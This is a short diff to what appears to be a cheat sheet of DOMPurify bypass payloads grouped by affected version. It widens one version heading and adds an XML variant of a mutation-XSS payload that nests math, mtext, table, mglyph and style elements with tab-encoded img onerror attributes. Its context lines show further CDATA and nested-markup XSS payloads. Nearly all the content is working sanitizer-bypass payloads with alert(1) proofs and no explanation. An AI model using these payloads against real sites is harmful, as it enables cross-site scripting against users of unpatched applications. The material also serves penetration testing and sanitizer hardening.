@@ -40,7 +40,7 @@ DOMPurify.sanitize('<UL><li><A HREF=//google.com>click</UL>'); // becomes <ul><l
 <![CDATA[ ><img src onerror=alert(1)> ]]>
 ```
 
-### Version 3.0.8
+### Version <= 3.0.8
 
 - [Playing with DOMPurify custom elements handling](https://mizu.re/post/playing-with-dompurify-ce-handling)
 
@@ -60,6 +60,11 @@ DOMPurify.sanitize('<UL><li><A HREF=//google.com>click</UL>'); // becomes <ul><l
 ```html
 <math><mtext><table><mglyph><style>
 <!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+```
+
+```xml
+<math><mtext><table><mglyph><style>
+<!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
 ```
 
 ### Version < 2.0.17
